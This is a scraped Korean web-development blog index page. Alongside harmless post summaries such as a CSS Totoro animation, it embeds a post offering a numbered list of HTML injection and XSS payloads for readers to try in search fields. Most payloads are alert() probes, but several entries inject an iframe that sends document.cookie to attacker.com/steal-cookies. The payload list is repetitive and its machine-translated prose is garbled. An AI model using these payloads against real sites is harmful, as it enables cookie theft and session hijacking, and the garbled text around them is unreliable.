<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><title>allround-coder</title><meta name="description" content="I develop websites, games and apps with HTML, CSS and JS."/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:url" content="https://allround-coder.github.io///posts/65" data-gatsby-head="true"/><meta property="og:type" content="website" data-gatsby-head="true"/><meta property="og:site_name" content="allround-coder" data-gatsby-head="true"/><meta property="og:title" content="allround-coder" data-gatsby-head="true"/><meta property="og:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta property="og:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta property="og:locale" content="en_US" data-gatsby-head="true"/><meta name="twitter:card" content="summary_large_image" data-gatsby-head="true"/><meta property="twitter:domain" content="https://allround-coder.github.io/" data-gatsby-head="true"/><meta property="twitter:url" content="https://allround-coder.github.io///posts/65" data-gatsby-head="true"/><meta name="twitter:title" content="allround-coder" data-gatsby-head="true"/><meta name="twitter:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta name="twitter:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta name="twitter:data1" content="Dev | allround-coder" data-gatsby-head="true"/><meta name="next-head-count" content="18"/><meta name="google-site-verification" content="a-yehRo3k3xv7fg6LqRaE8jlE42e5wP2bDE_2F849O4"/><link rel="stylesheet" href="/favicons/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/assets/favicons/favicon-96x96.png"/><link rel="icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-startup-image" href="/startup.png"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-config" content="/favicons/browserconfig.xml"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-ZFDEQ947R4"></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
  
            gtag('config', 'G-ZFDEQ947R4');</script><link rel="preload" href="/_next/static/css/6e57edcf9f2ce551.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e57edcf9f2ce551.css" data-n-g=""/><link rel="preload" href="/_next/static/css/baeec1f16d6ea8b8.css" as="style"/><link rel="stylesheet" href="/_next/static/css/baeec1f16d6ea8b8.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-ee6df16fdc6dae4d.js" defer=""></script><script src="/_next/static/chunks/framework-46611630e39cfdeb.js" defer=""></script><script src="/_next/static/chunks/main-cf4a52eec9a970a0.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6fae11262ee5c69b.js" defer=""></script><script src="/_next/static/chunks/75fc9c18-4a646156c659a948.js" defer=""></script><script src="/_next/static/chunks/348-d11c34b645b13f5b.js" defer=""></script><script src="/_next/static/chunks/324-8452a6176b22a926.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpage%5D-082571b43b6fd145.js" defer=""></script><script src="/_next/static/K-h7XvEVBqnNx_uXMgZoe/_buildManifest.js" defer=""></script><script src="/_next/static/K-h7XvEVBqnNx_uXMgZoe/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="posts_container__s9Z_H posts_-list__bsl0U"><header class="Header_header__Z8PUO"><div class="Header_inner__tfr0u"><strong class="Header_title__Otn70"><a href="/">Allround Coder</a></strong><nav class="Header_nav_area__6KVpk"><a class="nav_item" href="/posts/1">Posts</a></nav></div></header><div class="posts_inner__HIBjT"><article><h2 class="SectionTitle_section_title__HS_xr">Posts</h2><div class="posts_project_list__oDV_y"><div class="PostList_post_list__or0rl"><a class="PostList_post_item__gAdVi" aria-label="HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기" href="/post/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">2<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="HTML 삽입 (페이로드 목록)" href="/post/2024-05-02-HTMLINJECTIONPayloadList"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="HTML 삽입 (페이로드 목록)" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="HTML 삽입 (페이로드 목록)" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">HTML 삽입 (페이로드 목록)</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="CSS 기초 문법 정리" href="/post/2024-05-02-IntroductiontoCSSSyntax"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="CSS 기초 문법 정리" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="CSS 기초 문법 정리" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">CSS 기초 문법 정리</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">1<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기" href="/post/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 2, 2024</span><span class="PostList_reading_time__6CBMQ">2<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지" href="/post/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지</strong><div class="PostList_meta__VCFLX"><span class="date">May 1, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="프론트엔드 개발자를 위한 필수 치트 8가지" href="/post/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="프론트엔드 개발자를 위한 필수 치트 8가지" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="프론트엔드 개발자를 위한 필수 치트 8가지" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">프론트엔드 개발자를 위한 필수 치트 8가지</strong><div class="PostList_meta__VCFLX"><span class="date">May 1, 2024</span><span class="PostList_reading_time__6CBMQ">4<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="크로스 도메인에서 로컬스토리지 구현하기" href="/post/2024-05-01-Howtoachievecross-domainlocalStorage"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="크로스 도메인에서 로컬스토리지 구현하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-Howtoachievecross-domainlocalStorage_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="크로스 도메인에서 로컬스토리지 구현하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">크로스 도메인에서 로컬스토리지 구현하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 1, 2024</span><span class="PostList_reading_time__6CBMQ">6<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="HTMX와 Express.JS를 이용해 얼굴 인식 기능 추가하기" href="/post/2024-05-01-IntegratingFaceIOusingHTMXandExpressJS"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="HTMX와 Express.JS를 이용해 얼굴 인식 기능 추가하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-IntegratingFaceIOusingHTMXandExpressJS_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="HTMX와 Express.JS를 이용해 얼굴 인식 기능 추가하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">HTMX와 Express.JS를 이용해 얼굴 인식 기능 추가하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 1, 2024</span><span class="PostList_reading_time__6CBMQ">4<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="앵귤러로 웹사이트 만들 때 캐시 함정을 피하는 방법" href="/post/2024-05-01-AvoidcachetrapwhenservingAngularapp"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="앵귤러로 웹사이트 만들 때 캐시 함정을 피하는 방법" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-AvoidcachetrapwhenservingAngularapp_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="앵귤러로 웹사이트 만들 때 캐시 함정을 피하는 방법" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">앵귤러로 웹사이트 만들 때 캐시 함정을 피하는 방법</strong><div class="PostList_meta__VCFLX"><span class="date">May 1, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="Figma 디자인을 HTML과 CSS로 변환하는 플러그인 10가지" href="/post/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="Figma 디자인을 HTML과 CSS로 변환하는 플러그인 10가지" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="Figma 디자인을 HTML과 CSS로 변환하는 플러그인 10가지" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">Figma 디자인을 HTML과 CSS로 변환하는 플러그인 10가지</strong><div class="PostList_meta__VCFLX"><span class="date">May 1, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a></div></div></article><div class="posts_pagination__R_03T"><button type="button" class="page_button -prev">&lt;</button><a class="link" href="/posts/61">61</a><a class="link" href="/posts/62">62</a><a class="link" href="/posts/63">63</a><a class="link" href="/posts/64">64</a><a class="link" href="/posts/65">65</a><a class="link" href="/posts/66">66</a><a class="link" href="/posts/67">67</a><a class="link" href="/posts/68">68</a><a class="link" href="/posts/69">69</a><a class="link" href="/posts/70">70</a><a class="link" href="/posts/71">71</a></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"posts":[{"title":"HTML과 CSS를 사용하여 애니메이션으로 뛰는 토토로 만들기","description":"","date":"2024-05-02 00:03","slug":"2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS","content":"\n\n![이미지](https://miro.medium.com/v2/resize:fit:1200/1*DQhfTbm3hP_-igEhkhk4Hw.gif)\n\n스튜디오 지브리의 매력을 웹 개발 여정에 더해볼준비가 되셨나요? 오늘의 프로젝트에서는 사랑받는 영화 \"이웃의 토토로\"의 상징적 캐릭터에서 영감을 받아 애니메이션된 점프하는 토토로를 만들어볼 것입니다. 이 프로젝트는 #100DaysOfCode 챌린지 22일차의 일환으로, HTML, CSS 및 소량의 애니메이션 마법으로 프론트엔드 개발을 탐험하는 과정입니다. 시작해봅시다!\n\n# 단계 1: 프로젝트 설정하기\n\n시작하기 전에, 제공된 링크에서 전체 소스 코드를 다운로드했는지 확인해주세요: 소스 코드 다운로드. 다운로드가 완료되면, 새 프로젝트 디렉토리를 생성하고 소스 코드 파일을 추출하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 2: 구조 이해하기\n\n코드 에디터에서 프로젝트 파일을 열어보세요. 여기에는 HTML, CSS 및 필요에 따라 JavaScript 파일이 포함되어 있을 겁니다. 다양한 파일이 어떻게 연결되어 있는지 이해해보세요.\n\n# 단계 3: HTML 마크업\n\nindex.html 파일을 열어보세요. 이곳에서 우리의 웹 페이지 구조를 정의합니다. HTML 마크업에는 컨테이너, 토토로의 몸통 부분(귀, 눈, 코 등) 및 애니메이션 클래스 등 다양한 요소가 포함되어 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 4: CSS로 스타일링하기\n\nstyle.css 파일에서 당신은 당신의 토토로에 생명을 불어넣는 스타일을 찾을 수 있습니다. CSS에는 위치, 크기, 색상 및 애니메이션 키프레임이 포함되어 뛰는 효과를 만듭니다. 각 CSS 규칙은 특정 요소나 애니메이션 속성에 해당합니다.\n\n# 단계 5: 애니메이션 추가하기\n\nstyle.css 파일에 정의된 CSS 애니메이션 키프레임을 살펴보세요. 이러한 키프레임은 토토로의 몸통, 귀, 수염 및 그림자의 움직임과 압축 효과를 제어합니다. 원하는 효과를 달성하기 위해 애니메이션 지속 시간, 타이밍, 그리고 이징을 실험해보세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 6: 테스트 및 디버깅\n\n수정을 완료한 후 인덱스.html 파일을 웹 브라우저에서 열어 애니메이션을 테스트하세요. 브라우저의 개발자 도구를 사용하여 요소를 검사하고 CSS 문제를 디버깅하며 애니메이션 매개변수를 세밀하게 조정하세요.\n\n# 단계 7: 튜닝 및 사용자 정의\n\n원하는 대로 토토로 디자인, 색상 및 애니메이션을 사용자 정의하세요. 토토로의 몸통 부분의 크기, 위치, 모양을 조절하거나 전체적인 모습을 향상시키기 위해 추가 요소를 추가할 수도 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 단계 8: 당신의 작품 공유하기\n\n애니메이션으로 뛰어오르는 토토로에 만족하셨다면, 소셜 미디어나 코드 공유 플랫폼에 프로젝트를 공유해 다른 사람들을 영감을 주고 코딩 스킬을 과시해보세요. 또한 이 프로젝트를 만들면서 느낀 경험을 나누며 동료 개발자들과 연결할 수도 있어요. 이것이 #100DaysOfCode 챌린지의 22일차를 완료한 것을 축하합니다!\n\n애니메이션으로 뛰어오르는 토토로를 만들면서 프론트엔드 개발 스킬을 키우는 동시에 코딩 여정에 신비로운 터치를 불어넣었어요. 계속해서 코딩을 하며 창작을 이어가고 영감을 받아보세요! 궁금한 점이 있거나 경험을 공유하고 싶다면 언제든지 Bento에서 저와 연락하실 수 있어요.\n\n행복한 코딩 하세요! 🚀✨","ogImage":{"url":"/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png"},"coverImage":"/assets/img/2024-05-02-BuildinganAnimatedJumpingTotoroUsingHTMLandCSS_0.png","tag":["Tech"],"readingTime":2},{"title":"HTML 삽입 (페이로드 목록)","description":"","date":"2024-05-02 00:01","slug":"2024-05-02-HTMLINJECTIONPayloadList","content":"\n\n피신몽인 사람들, 다시 돌아\n\n주사, 이제 페이로드 목록을 가져 오는 것을 보여드리고, 검색 패널에서 시도해 볼 수 있으며, 그대로 반영될 수 있습니다 \u0026 저장되면 위험할 수도 있습니다,\n\n이제 같은 것에 대해 몇 가지 기본 사항을 살펴보겠습니다. HTML 주입이 무엇인지 알아보기 위해\n아스타 타커\nHTML 주입 또는 주입 관련 질문에 대해, 바로 코드만 제공해 드릴게요. 이것을 시도해서 혜택을 얻어보세요..... \n\n\n![HTML INJECTION Payload List](/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n페이로드 목록을 확인해 보세요...\n\n물론이죠! 저장된 및 반사된 HTML 주입 페이로드 100개를 모두 포함한 목록입니다:\n\n저장된 HTML 주입 페이로드:\n1. `script`alert(‘저장된 HTML 주입’)`/script`\n2. `img src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n3. `svg/onload=alert(‘저장된 HTML 주입’)`\n4. `iframe src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n5. `body onload=alert(‘저장된 HTML 주입’)`\n6. `img src=x onerror=alert(‘저장된 HTML 주입’)`\n7. `marquee onstart=alert(‘저장된 HTML 주입’)`\n8. `input type=\"image\" src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n9. `img src=1 href=1 onerror=alert(‘저장된 HTML 주입’) /`\n10. `input type=\"hidden\" onkeypress=\"alert(‘저장된 HTML 주입’)\"`\n11. `audio onloadstart=\"alert(‘저장된 HTML 주입’)\"`\n12. `form onsubmit=\"alert(‘저장된 HTML 주입’)\"`\n13. `textarea onchange=\"alert(‘저장된 HTML 주입’)\"`\n14. `base href=\"javascript:alert(‘저장된 HTML 주입’)\"`\n15. `a href=\"javascript:alert(‘저장된 HTML 주입’)\"`여기를 클릭하세요`/a`\n16. `object data=\"javascript:alert(‘저장된 HTML 주입’)\"`\n17. `img src=\"x\" onmouseover=\"alert(‘저장된 HTML 주입’)\"`\n18. `script`document.write(‘`iframe src=\"https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘\"``/iframe`’);`/script`\n19. `body background=\"javascript:alert(‘저장된 HTML 주입’)\"`\n20. `embed src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n21. `script`alert(‘반사된 HTML 주입’)`/script`\n22. `img src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n23. `svg/onload=alert(‘반사된 HTML 주입’)`\n24. `iframe src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n25. `body onload=alert(‘반사된 HTML 주입’)`\n26. `img src=x onerror=alert(‘반사된 HTML 주입’)`\n27. `marquee onstart=alert(‘반사된 HTML 주입’)`\n28. `input type=\"image\" src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n29. `img src=1 href=1 onerror=alert(‘반사된 HTML 주입’) /`\n30. `input type=\"hidden\" onkeypress=\"alert(‘반사된 HTML 주입’)\"`\n31. `audio onloadstart=\"alert(‘반사된 HTML 주입’)\"`\n32. `form onsubmit=\"alert(‘반사된 HTML 주입’)\"`\n33. `textarea onchange=\"alert(‘반사된 HTML 주입’)\"`\n34. `base href=\"javascript:alert(‘반사된 HTML 주입’)\"`\n35. `a href=\"javascript:alert(‘반사된 HTML 주입’)\"`여기를 클릭하세요`/a`\n36. `object data=\"javascript:alert(‘반사된 HTML 주입’)\"`\n37. `img src=\"x\" onmouseover=\"alert(‘반사된 HTML 주입’)\"`\n38. `script`document.write(‘`iframe src=\"https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘\"``/iframe`’);`/script`\n39. `body background=\"javascript:alert(‘반사된 HTML 주입’)\"`\n40. `embed src=\"javascript:alert(‘반사된 HTML 주입’)\"`\n\n41. `svg/onload=alert(‘저장된 HTML 주입’)`\n42. `body onload=alert(‘저장된 HTML 주입’)`\n43. `img src=x onerror=alert(‘저장된 HTML 주입’)`\n44. `marquee onstart=alert(‘저장된 HTML 주입’)`\n45. `input type=\"image\" src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n46. `img src=1 href=1 onerror=alert(‘저장된 HTML 주입’) /`\n47. `input type=\"hidden\" onkeypress=\"alert(‘저장된 HTML 주입’)\"`\n48. `audio onloadstart=\"alert(‘저장된 HTML 주입’)\"`\n49. `form onsubmit=\"alert(‘저장된 HTML 주입’)\"`\n50. `textarea onchange=\"alert(‘저장된 HTML 주입’)\"`\n51. `base href=\"javascript:alert(‘저장된 HTML 주입’)\"`\n52. `a href=\"javascript:alert(‘저장된 HTML 주입’)\"`여기를 클릭하세요`/a`\n53. `object data=\"javascript:alert(‘저장된 HTML 주입’)\"`\n54. `img src=\"x\" onmouseover=\"alert(‘저장된 HTML 주입’)\"`\n55. `script`document.write(‘`iframe src=\"https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘\"``/iframe`’);`/script`\n56. `body background=\"javascript:alert(‘저장된 HTML 주입’)\"`\n57. `embed src=\"javascript:alert(‘저장된 HTML 주입’)\"`\n58. `img src=\"javascript:alert(‘저장된 HTML 주입’)\" onerror=\"alert(‘저장된 HTML 주입’)\"`\n59. `body``svg``script`alert(‘저장된 HTML 주입’)`/script``/svg``/body`\n60. `a href=\"data:text/html,`script`alert(‘저장된 HTML 주입’)`/script`\"`여기를 클릭하세요`/a`\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n반가워요! \n\n다음은 HTML 주입 페이로드 결과입니다:\n61. `svg/onload=alert(‘주입된 HTML 삽입’)`\n62. `body onload=alert(‘주입된 HTML 삽입’)`\n63. `img src=x onerror=alert(‘주입된 HTML 삽입’)`\n64. `marquee onstart=alert(‘Reflected HTML Injection’)`\n65. `input type=\"image\" src=\"javascript:alert(‘주입된 HTML 삽입’)\"`\n66. `img src=1 href=1 onerror=alert(‘주입된 HTML 삽입’) /`\n67. `input type=\"hidden\" onkeypress=\"alert(‘주입된 HTML 삽입’)\"`\n68. `audio onloadstart=\"alert(‘주입된 HTML 삽입’)\"`\n69. `form onsubmit=\"alert(‘주입된 HTML 삽입’)\"`\n70. `textarea onchange=\"alert(‘주입된 HTML 삽입’)\"`\n71. `base href=\"javascript:alert(‘주입된 HTML 삽입’)\"`\n72. `a href=\"javascript:alert(‘주입된 HTML 삽입’)\"`Click me`/a`\n73. `object data=\"javascript:alert(‘주입된 HTML 삽입’)\"\n74. `img src=\"x\" onmouseover=\"alert(‘주입된 HTML 삽입’)\"`\n... 